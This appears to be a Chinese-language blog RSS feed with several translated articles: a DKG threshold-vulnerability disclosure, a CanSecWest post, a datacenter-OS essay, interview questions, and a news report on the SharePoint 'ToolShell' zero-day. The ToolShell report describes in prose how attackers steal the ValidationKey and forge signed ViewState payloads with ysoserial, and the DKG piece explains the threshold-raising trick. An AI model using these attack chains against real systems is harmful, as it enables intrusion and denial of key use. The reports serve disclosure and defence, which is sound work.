&lt;/h2&gt;&lt;p&gt;我们发现，如果参与者在Pedersen DKG协议中使用次数T大于t的多项式pi(x)，将导致最终多项式p(x)的次数变为T而非t。这意味着签名协议将需要T+1而非t+1参与者才能成功完成。如果其他参与者未检测到这一变化，攻击者可以秘密将阈值提高到超过参与者总数，从而使共享密钥无法使用。&lt;/p&gt;
&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h2&gt;&lt;p&gt;我们共发现10个实现存在此漏洞，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Frost参考实现&lt;/li&gt;
&lt;li&gt;ZCash Foundation的Frost实现&lt;/li&gt;
&lt;li&gt;Penumbra基于decaf377的Frost实现&lt;/li&gt;
&lt;li&gt;Frost-Dalek&lt;/li&gt;
&lt;li&gt;Toposware的ICE-FROST实现&lt;/li&gt;
&lt;li&gt;Trust Machines基于Frost的WSTS实现&lt;/li&gt;
&lt;li&gt;FROST-BIP340&lt;/li&gt;
&lt;li&gt;ZenGo-X的GG18和GG20实现&lt;/li&gt;
&lt;li&gt;Safeheron的GG20实现&lt;/li&gt;
&lt;li&gt;LatticeX的Open TSS GG20实现&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;披露过程&#34;&gt;披露过程
&lt;/h2&gt;&lt;p&gt;我们于2024年1月3日联系了相关维护者，其中7个团队确认收到披露，4个团队表示已修复或计划修复该问题。对于未回应的3个团队，我们于2024年2月7日进行了二次联系，随后Toposware也确认收到披露。&lt;/p&gt;
&lt;p&gt;（全文完）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CanSecWest安全大会：警惕与社区共舞的技术博弈</title>
        <link>http://localhost:1313/p/cansecwest%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A%E8%AD%A6%E6%83%95%E4%B8%8E%E7%A4%BE%E5%8C%BA%E5%85%B1%E8%88%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%BC%88/</link>
        <pubDate>Mon, 04 Aug 2025 11:07:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/cansecwest%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A%E8%AD%A6%E6%83%95%E4%B8%8E%E7%A4%BE%E5%8C%BA%E5%85%B1%E8%88%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%BC%88/</guid>
        <description>&lt;p&gt;&lt;strong&gt;CanSecWest：警惕与社区共舞&lt;/strong&gt;&lt;br&gt;
每年在温哥华举办的CanSecWest是我最喜爱的安全会议之一。这个小型安全会议汇聚了来自安全生态各领域的研究人员。如同PhNeutral或BlueHat会议，你永远无法预料CanSecWest会带来什么惊喜，但可以确定的是微软产品和工程师都将扮演重要角色。我们将展示新的安全创新工具，密切关注Pwn2Own竞赛中的潜在漏洞利用，并乐意在非正式交流中分享行业最佳实践。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安全协作的价值&lt;/strong&gt;&lt;br&gt;
这类安全聚会促使生态圈通过信息共享提升防御能力。正如Matt Miller的《微软漏洞缓解技术演进》和Jason Shirk与Dave Weinstein的《自动化实时与事后安全崩溃分析分类》所展示的，微软不断将攻击特征转化为开发者工具。Pwn2Own竞赛体现了我们安全团队的两大信条：真相无法掩盖（幻想不能改变事实），每个问题都是学习进步的契机。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;微软的安全哲学&lt;/strong&gt;&lt;br&gt;
我们承认所有厂商产品都可能存在漏洞，并将此类竞赛视为促进负责任披露对话的机会。Pwn2Own不仅能教育公众，更能展示微软安全工程的实力。竞赛结束后，赞助方TippingPoint将获得新漏洞的所有权，而微软已准备好分析研究人员发现的任何漏洞，持续强化网络、平台和应用安全。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安全社区的&amp;quot;对手团队&amp;quot;战略&lt;/strong&gt;&lt;br&gt;
虽然创新竞赛常令人不安，但Pwn2Own和Black Hat铁厨大赛等活动的真正价值在于推动生态圈共同解决共性问题。正如会议组织方坚持负责任披露政策，微软始终致力于将漏洞信息转化为更强大的工程实践。竞赛序幕已经拉开！&lt;/p&gt;
&lt;p&gt;——Sarah Blankinship（高级安全战略负责人）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>消失的操作系统：数据中心OS的技术演进与挑战</title>
        <link>http://localhost:1313/p/%E6%B6%88%E5%A4%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83os%E7%9A%84%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B%E4%B8%8E%E6%8C%91%E6%88%98/</link>
        <pubDate>Mon, 04 Aug 2025 10:40:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B6%88%E5%A4%B1%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83os%E7%9A%84%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B%E4%B8%8E%E6%8C%91%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;消失的操作系统&#34;&gt;消失的操作系统
&lt;/h1&gt;&lt;h2 id=&#34;前言&#34;&gt;前言
&lt;/h2&gt;&lt;p&gt;2011年我加入谷歌时，曾引用朋友的一句玩笑：&amp;ldquo;世界上大约有一台半计算机，谷歌拥有其中一台。&amp;ldquo;自2011年以来世界已发生巨变，现在全球可能有五六台这样的&amp;quot;计算机&amp;rdquo;。在下文中，当我说&amp;quot;计算机&amp;quot;时，指的是由大量独立机器连接组成的、能像单台计算机一样运作的超大规模集群。&lt;/p&gt;
&lt;h2 id=&#34;正文&#34;&gt;正文
&lt;/h2&gt;&lt;p&gt;现代微服务部署的技术生态令人困惑——变化迅速，大量表面相似的项目声称能实现类似功能。即使对我这样深耕技术领域的人而言，不同项目的精确用途也不总是清晰的。&lt;/p&gt;
&lt;p&gt;我多次提及&amp;quot;数据中心操作系统&amp;quot;的概念（至少&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a51&#34; &gt;这里&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a52&#34; &gt;这里&lt;/a&gt;），自2015年从谷歌休假以来一直在思考这个问题。最近与一群性能工程师（他们处于开发与运维的交汇点）的交流促使我写下这些思考。这是第一篇相关文章，后续可能还有更多（特别是关于其安全模型的内容）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;警告&lt;/strong&gt;：本文纯属个人观点，包含大量未经科学验证的主张。我经常犯错。&lt;/p&gt;
&lt;p&gt;我的核心观点是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;计算机发展初期，经过数十年才出现真正的&amp;quot;操作系统&amp;rdquo;。在真正OS出现前，存在许多&amp;quot;原型OS&amp;quot;——需要单独管理拼凑的工具集合。当时全球计算机数量稀少，使用计算机需在大型研究机构工作。这些机器运行着为该计算机专门拼凑的独特OS。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大约从2007年开始，我们正经历第二个类似时期：&amp;ldquo;单台计算机&amp;quot;模式被&amp;quot;仓库级计算机&amp;quot;取代。最初只有少数财力雄厚的组织能拥有这样的计算机，但云计算使得没有数十亿美元建设完整数据中心的公司也能使用&amp;quot;大量小型独立计算机&amp;rdquo;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;超大规模企业（谷歌、Facebook，也包括腾讯等）内部正在构建&amp;quot;原型数据中心OS&amp;quot;；亚马逊正在将其部分系统外部化；大量构成数据中心OS的独立组件已作为开源项目存在。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;但目前尚不存在一个普通公司可以直接安装的完整数据中心OS&lt;/strong&gt;。存在一个&amp;quot;消失的OS&amp;quot;——安装在大量计算机集合上的软件，将这些计算机集合转变为&amp;quot;一台计算机&amp;quot;。&lt;/p&gt;
&lt;h2 id=&#34;数据中心os的组成&#34;&gt;数据中心OS的组成
&lt;/h2&gt;&lt;p&gt;观察现代技术栈会发现一个惊人的趋同现象——不在于人们实际运行的软件，而在于需要实现的&amp;quot;角色&amp;quot;。每个角色通常都有多种不同的实现方案。每个大规模分布式基础设施都包含以下组件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;集群级文件系统&lt;/strong&gt;：谷歌内部使用GFS/Colossus，外部可能是GlusterFS等。许多公司最终使用S3，因为现有方案不够理想。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;水平可扩展键值存储&lt;/strong&gt;：谷歌内部用BigTable，外部可能是Cassandra、Scylla，甚至ElasticSearch（勉强算）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分布式一致性键值存储&lt;/strong&gt;：谷歌内部用Chubby，外部用etcd。大多数应用不直接使用，主要用于集群管理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;发布/订阅消息队列系统&lt;/strong&gt;：如PubSub、Kafka、AWS的SQS或RabbitMQ。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;任务调度/容器编排系统&lt;/strong&gt;：根据可用资源、待运行任务和约束条件，解决受限的装箱优化问题以确保资源合理利用。如Borg，某种程度上也包括Kubernetes。可能与MapReduce风格的批量工作负载基础设施集成以利用闲置CPU周期。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;缺失的工具与挑战&#34;&gt;缺失的工具与挑战
&lt;/h2&gt;&lt;p&gt;思考&amp;quot;单机OS上有哪些组件应该在数据中心OS中存在&amp;quot;非常有价值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;人们通过Prometheus和各种数据收集代理构建了近似&amp;quot;进程管理器&amp;quot;的工具&lt;/li&gt;
&lt;li&gt;分布式追踪（公认的必需品）实质上是数据中心版的strace&lt;/li&gt;
&lt;li&gt;&amp;ldquo;数据中心版的syslog是什么&amp;quot;同样是个有趣问题&lt;/li&gt;
&lt;li&gt;大量可观测性工程实质是将单机自省能力移植到&amp;quot;计算机&amp;quot;上&lt;/li&gt;
&lt;li&gt;人们谈论的&amp;quot;服务网格&amp;quot;是否只是数据中心版的portmapper？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还有一些功能我们完全不知道如何构建对应方案。比如&amp;quot;计算机&amp;quot;的&amp;quot;调试器&amp;quot;应该是什么样子？显然，在单主机上单步执行不是解决现代分布式系统问题的正确方式——你的服务可能与数十台其他主机交互，这些主机可能同时崩溃（或逐渐停止等），重新启动和单步执行极其困难。&lt;/p&gt;
&lt;p&gt;除了需要为&amp;quot;计算机&amp;quot;重建的众多监控、开发和调试工具外，还有许多更基础的问题没有满意答案。&lt;strong&gt;安全领域尤其未知&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是这台&amp;quot;计算机&amp;quot;的&amp;quot;特权进程&amp;rdquo;？&lt;/li&gt;
&lt;li&gt;权限和信任边界是什么？&lt;/li&gt;
&lt;li&gt;用户管理如何工作？&lt;/li&gt;
&lt;li&gt;跨服务认证和凭据委派如何实现？&lt;/li&gt;
&lt;li&gt;如何避免将James Forshaw在其幻灯片中描述的所有单机权限提升漏洞重新引入我们的新OS和各种服务？&lt;/li&gt;
&lt;li&gt;是否有办法确保Linux内核的/mm单个漏洞不会导致整个安全模型崩溃？&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;结语&#34;&gt;结语
&lt;/h2&gt;&lt;p&gt;简而言之，我认为正在浮现的数据中心OS是计算机科学几十年来最激动人心的发展。有时我希望自己更擅长说服亿万富翁投资几亿美元解决有趣问题——因为如果有我想致力于解决的问题，那就是开发一个FOSS数据中心OS——&amp;ldquo;在N台机器上安装这个，你就拥有了&amp;rsquo;一台计算机&amp;rsquo;&amp;quot;。如果思考&amp;quot;这个特定组件在&amp;rsquo;计算机&amp;rsquo;中实现什么功能？这个项目的单机等价物是什么？&amp;quot;，许多技术景观会更容易理解。&lt;/p&gt;
&lt;p&gt;本文可能会有后续，因为关于这个话题我还有更多不成熟的想法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据中心OS的安全模型&lt;/li&gt;
&lt;li&gt;Kubernetes：你想成为调度器还是OS？只能选一个&lt;/li&gt;
&lt;li&gt;如何获得bash脚本的强大功能，但针对2万台机器的集群？&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>微软紧急修复被利用的SharePoint &#34;ToolShell&#34;漏洞</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84sharepoint-toolshell%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Mon, 04 Aug 2025 10:18:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84sharepoint-toolshell%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;微软紧急修复被利用的sharepoint-toolshell漏洞&#34;&gt;微软紧急修复被利用的SharePoint &amp;ldquo;ToolShell&amp;quot;漏洞
&lt;/h1&gt;&lt;p&gt;恶意攻击者已经利用这个被追踪为CVE-2025-53770的零日漏洞，入侵了美国政府机构和其他企业，攻击正在广泛持续进行中。&lt;/p&gt;
&lt;p&gt;微软今日发布更新，修补了Microsoft SharePoint Server中的一个关键零日漏洞。攻击者已经利用该漏洞对美国联邦和州政府机构以及其他全球组织发起了一波持续攻击。&lt;/p&gt;
&lt;p&gt;攻击链涉及利用这个CVSS评分9.8的关键漏洞(CVE-2025-53770)和一个路径遍历漏洞(CVE-2025-53771)。根据国家漏洞数据库的条目，CVE-2025-53770存在于&amp;quot;本地部署的Microsoft SharePoint Server中对不可信数据的反序列化&amp;quot;中，使得&amp;quot;未经授权的攻击者可以通过网络执行代码&amp;rdquo;。&lt;/p&gt;
&lt;p&gt;根据Ontinue高级威胁运营(ATO)团队今日发布的博客文章，要利用此漏洞，&amp;ldquo;攻击者会精心构造恶意序列化数据，服务器会错误地反序列化这些数据，从而导致未经身份验证的远程代码执行。不需要事先访问或用户交互。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;这个被称为&amp;quot;ToolShell&amp;quot;的攻击链可以让攻击者完全控制组织内部本地运行的Microsoft SharePoint Server。不过，该攻击不适用于Microsoft 365版本的SharePoint Online。&lt;/p&gt;
&lt;h2 id=&#34;cve-2025-53770的全球大规模利用&#34;&gt;CVE-2025-53770的全球大规模利用
&lt;/h2&gt;&lt;p&gt;在微软7月19日披露时还没有补丁的CVE-2025-53770被广泛利用的报告在上周末出现。《华盛顿邮报》7月20日报道称，攻击者已经利用该漏洞&amp;quot;入侵了美国联邦和州政府机构、大学、能源公司和一家亚洲电信公司&amp;quot;，援引了州官员和私人研究人员的话。美国网络安全和基础设施安全局(CISA)也拉响警报，昨天将CVE-2025-53770添加到其已知被利用漏洞目录中，并建议组织立即采取措施进行缓解。&lt;/p&gt;
&lt;p&gt;根据微软针对CVE-2025-53770的安全公告，微软已经发布了&amp;quot;安全更新，完全保护使用SharePoint订阅版和SharePoint 2019的客户免受CVE-2025-53770和CVE-2025-53771带来的风险&amp;quot;。这些更新包括针对Microsoft SharePoint订阅版和SharePoint 2019的补丁，还为CVE-2025-49704和CVE-2025-49706提供了更强大的保护。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;客户应立即应用这些更新以确保受到保护，&amp;ldquo;该公司表示，并补充说它正在为支持的SharePoint 2019和SharePoint 2016版本开发安全更新，建议这些客户定期查看以获取更多信息。&lt;/p&gt;
&lt;p&gt;虽然没有关于攻击责任方的确切信息，但根据Ontinue ATO的帖子，威胁情报表明中国的Silk Typhoon或Storm-0506(又名Black Basta)等组织可能参与其中。&lt;/p&gt;
&lt;h2 id=&#34;面临风险的sharepoint服务器&#34;&gt;面临风险的SharePoint服务器
&lt;/h2&gt;&lt;p&gt;这个漏洞的问题似乎源于德国进攻性安全组织Code White Gmbh在社交媒体平台X上的一篇随意帖子，该帖子演示了针对SharePoint的未经身份验证的RCE攻击链，结合了5月在柏林Pwn2Own会议上披露的两个漏洞。这两个漏洞——一个是被追踪为CVE-2025-49704的代码注入漏洞，另一个是被追踪为CVE-2025-49706的身份验证漏洞——是由Viettel网络安全的研究员Dinh Ho Anh Khoa发现的。&lt;/p&gt;
&lt;p&gt;根据CISA和微软的说法，CVE-2025-53770是CVE-2025-49706的一个变种。&lt;/p&gt;
&lt;p&gt;攻击的最初迹象出现在7月18日星期五晚上，当时Eye Security的研究人员注意到大规模主动利用，他们在全球扫描了8000多台SharePoint服务器后，发现&amp;quot;数十个系统在那天晚上和第二天被主动入侵&amp;rdquo;，他们在7月19日发布的博客文章中写道。&lt;/p&gt;
&lt;p&gt;他们观察到的攻击涉及&amp;quot;一个经典的web shell，在自定义路径中的混淆代码，旨在通过HTTP允许远程命令执行&amp;rdquo;，根据Eye Security的帖子。&lt;/p&gt;
&lt;p&gt;起初，研究人员认为他们看到的是对Active Directory Federation Services (ADFS)的暴力破解或凭据填充攻击，随后是使用有效凭据的认证上传或远程代码尝试。&amp;ldquo;受影响的SharePoint服务器暴露在互联网上，并使用混合ADFS与Azure AD绑定，&amp;ldquo;他们写道。&amp;ldquo;当配置错误或过时时，这种堆栈可能是一个危险的组合。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;识别toolshell攻击&#34;&gt;识别ToolShell攻击
&lt;/h2&gt;&lt;p&gt;最终，研究人员进行了一些挖掘，发现了Code White的ToolShell X帖子，当时这被认为是一个概念验证(PoC)，没有公开代码或明确的漏洞利用细节。他们很快意识到这正是他们观察到的攻击向量——它本身与另一个SharePoint漏洞CVE-2021-28474之前的攻击向量相似。&lt;/p&gt;
&lt;p&gt;在之前的攻击向量中，&amp;ldquo;攻击者滥用SharePoint页面中的服务器端控制解析逻辑，将意外对象注入页面生命周期，&amp;ldquo;根据Eye Security的说法。&lt;/p&gt;
&lt;p&gt;研究人员表示，这是可能的，因为SharePoint使用存储在机器配置中的签名密钥(即ValidationKey)加载和执行ASP.NET ViewState对象。&amp;ldquo;通过精心构造带有序列化payload的恶意页面请求，并正确签名，攻击者可以使SharePoint反序列化任意对象并执行嵌入的命令，&amp;ldquo;根据帖子。&amp;ldquo;然而，漏洞利用受到生成有效签名的要求的限制，这反过来需要访问服务器的秘密ValidationKey。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;研究人员解释说，在ToolShell链中，攻击者似乎直接从内存或配置中提取ValidationKey。&amp;ldquo;一旦这些加密材料泄露，攻击者就可以使用一个名为ysoserial的工具制作完全有效的、已签名的__VIEWSTATE payload，&amp;ldquo;这使得攻击者可以为RCE生成自己的有效SharePoint令牌，根据帖子。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;这些payload可以嵌入任何恶意命令，并被服务器作为可信输入接受，完成RCE链而不需要凭据，&amp;ldquo;根据Eye Security的说法。&amp;ldquo;这反映了2021年被利用的设计弱点，但现在打包成了一个现代的零日链，具有自动shell投放、完全持久性和零认证。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;其他缓解措施&#34;&gt;其他缓解措施
&lt;/h2&gt;&lt;p&gt;最新的零日攻击标志着微软又一次受挫，去年国家行为者Midnight Blizzard入侵微软企业电子邮件账户并在此过程中窃取了联邦机构的凭据后，该公司面临越来越多的审查，这促使CISA发布了紧急指令。联邦网络安全审查委员会在一份期待已久的报告中随后的发现发现，该公司也未能防止之前对其Microsoft Exchange Online环境的单独黑客攻击，引发了对该供应商的新一波批评。&lt;/p&gt;
&lt;p&gt;安全研究人员表示，不应低估对SharePoint的更多攻击的可能性，并建议组织立即对所有易受攻击的系统应用缓解措施。SharePoint被大大小小的组织广泛用于业务文档共享，因此由于攻击者可以通过访问实例获取敏感信息，它成为威胁行为者的热门攻击向量。事实上，ToolShell让人想起去年秋天PoC发布后对另一个反序列化漏洞CVE-2024-38094的广泛利用。&lt;/p&gt;
&lt;p&gt;微软表示，它仍在为SharePoint 2016开发补丁。对于无法立即应用CVE-2025-53770和CVE-2025-53771修复程序或正在运行SharePoint 2016的组织，该公司建议采取其他快速行动进行缓解。&lt;/p&gt;
&lt;p&gt;这些行动包括部署Defender for Endpoint以检测漏洞利用后的活动，确保在本地SharePoint Server中集成AMSI，并在所有SharePoint主机上启用Microsoft Defender Antivirus。此外，微软表示，如果无法启用AMSI，组织应完全将易受攻击的系统与互联网断开连接，直到他们能够完全修补系统。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>22个软件工程师面试问题（附答案）——技术面试全攻略</title>
        <link>http://localhost:1313/p/22%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%99%84%E7%AD%94%E6%A1%88%E6%8A%80%E6%9C%AF%E9%9D%A2%E8%AF%95%E5%85%A8%E6%94%BB%E7%95%A5/</link>
        <pubDate>Mon, 04 Aug 2025 10:00:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/22%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%99%84%E7%AD%94%E6%A1%88%E6%8A%80%E6%9C%AF%E9%9D%A2%E8%AF%95%E5%85%A8%E6%94%BB%E7%95%A5/</guid>
        <description>&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;描述你的软件开发流程&lt;/strong&gt;&lt;br&gt;
首先理解软件需求，然后绘制程序流程图，接着编写各功能代码，提交QA测试，最终确保用户满意。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;解释大O表示法&lt;/strong&gt;&lt;br&gt;
用于衡量算法时间复杂度，比较不同解决方案的效率，展示算法随输入规模增长的变化趋势。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;如何测试和发现缺陷&lt;/strong&gt;&lt;br&gt;
采用敏捷/瀑布模型分阶段测试，使用调试工具（如GDB），团队代码审查确保质量，最后QA验收测试。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;栈的定义及操作&lt;/strong&gt;&lt;br&gt;
后进先出(LIFO)的数据结构，支持push（压栈）和pop（弹栈）两种基本操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;向非技术人员解释云计算&lt;/strong&gt;&lt;br&gt;
云是远程存储设备，通过互联网访问。程序也可云端运行，日常网络活动（搜索、购物）都依赖云服务。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;模块与模块化编程&lt;/strong&gt;&lt;br&gt;
模块是可复用的独立代码块，模块化编程要求将功能拆分为独立模块，提升代码可维护性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;负载均衡器原理&lt;/strong&gt;&lt;br&gt;
通过轮询/最小连接/最短时间等算法，将客户端请求分发到多台服务器，提高系统可靠性和效率。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;优秀软件工程师的核心技能&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题解决能力&lt;/li&gt;
&lt;li&gt;编程语言/面向对象设计/测试调试等技术能力&lt;/li&gt;
&lt;li&gt;沟通协作能力&lt;/li&gt;
&lt;li&gt;项目管理能力&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;软件范围定义流程&lt;/strong&gt;&lt;br&gt;
明确项目目标、预期产出、包含/不包含的功能任务，在预算约束下控制项目范围。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;函数式vs面向对象编程&lt;/strong&gt;&lt;br&gt;
OOP通过类和对象组织代码，强调封装继承；函数式使用纯函数，输入决定输出，无外部状态影响。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数组与链表的区别&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;对比维度&lt;/th&gt;
          &lt;th&gt;数组&lt;/th&gt;
          &lt;th&gt;链表&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;存储方式&lt;/td&gt;
          &lt;td&gt;连续内存&lt;/td&gt;
          &lt;td&gt;节点+指针&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;大小&lt;/td&gt;
          &lt;td&gt;固定&lt;/td&gt;
          &lt;td&gt;动态分配&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;访问速度&lt;/td&gt;
          &lt;td&gt;O(1)&lt;/td&gt;
          &lt;td&gt;O(n)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;插入删除效率&lt;/td&gt;
          &lt;td&gt;需重新索引&lt;/td&gt;
          &lt;td&gt;直接修改指针&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;验证与确认的区别&lt;/strong&gt;&lt;br&gt;
验证是静态测试（文档/代码审查），确认是动态测试（运行程序检查功能/性能）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;瀑布模型开发阶段&lt;/strong&gt;&lt;br&gt;
需求分析→设计→实现→验证→维护。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;递归函数&lt;/strong&gt;&lt;br&gt;
函数自我调用直至满足基线条件，每次调用修改参数值，典型应用如阶乘计算。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;单体vs微服务架构&lt;/strong&gt;&lt;br&gt;
单体应用是统一代码库，微服务由独立部署的小服务组成，通过API通信。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;黑盒与白盒测试&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;黑盒：测试功能不关心实现，由QA执行&lt;/li&gt;
&lt;li&gt;白盒：测试代码逻辑，开发者单元测试时使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;接口与抽象类&lt;/strong&gt;&lt;br&gt;
接口定义行为契约（多继承），抽象类提供共性实现（单继承），均不能直接实例化。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;耦合与内聚&lt;/strong&gt;&lt;br&gt;
低耦合（模块独立）高内聚（模块内功能相关）是优秀设计标准，提升可维护性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;项目评估方法&lt;/strong&gt;&lt;br&gt;
分解SDLC阶段→细化需求→拆分任务→估算工时（考虑团队能力）→设置单任务上限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;自建数据库步骤&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建REPL交互环境&lt;/li&gt;
&lt;li&gt;开发SQL编译器&lt;/li&gt;
&lt;li&gt;选用B树等存储结构&lt;/li&gt;
&lt;li&gt;TDD方式编写测试&lt;/li&gt;
&lt;li&gt;实现磁盘持久化&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;继承概念&lt;/strong&gt;&lt;br&gt;
OOP核心特性，子类继承父类属性和方法，实现代码复用和层次化设计。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;软件保护措施&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安全开发生命周期(SDL)&lt;/li&gt;
&lt;li&gt;静态代码分析&lt;/li&gt;
&lt;li&gt;加密/哈希/参数化查询&lt;/li&gt;
&lt;li&gt;权限最小化原则&lt;/li&gt;
&lt;li&gt;渗透测试&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>2023年游戏开发最佳GPU推荐</title>
        <link>http://localhost:1313/p/2023%E5%B9%B4%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E6%9C%80%E4%BD%B3gpu%E6%8E%A8%E8%8D%90/</link>
        <pubDate>Mon, 04 Aug 2025 09:54:42 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2023%E5%B9%B4%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E6%9C%80%E4%BD%B3gpu%E6%8E%A8%E8%8D%90/</guid>
        <description>&lt;h1 id=&#34;2023年游戏开发最佳gpu&#34;&gt;2023年游戏开发最佳GPU
&lt;/h1&gt;&lt;p&gt;作者：John Sonmez&lt;br&gt;
显卡(GPU)是影响游戏开发效率的关键硬件。性能不足会导致3D建模耗时增加、渲染过程缓慢，特别是在使用Unreal Engine等强力引擎时，高端GPU能显著提升开发体验。&lt;/p&gt;
&lt;h2 id=&#34;快速推荐&#34;&gt;快速推荐
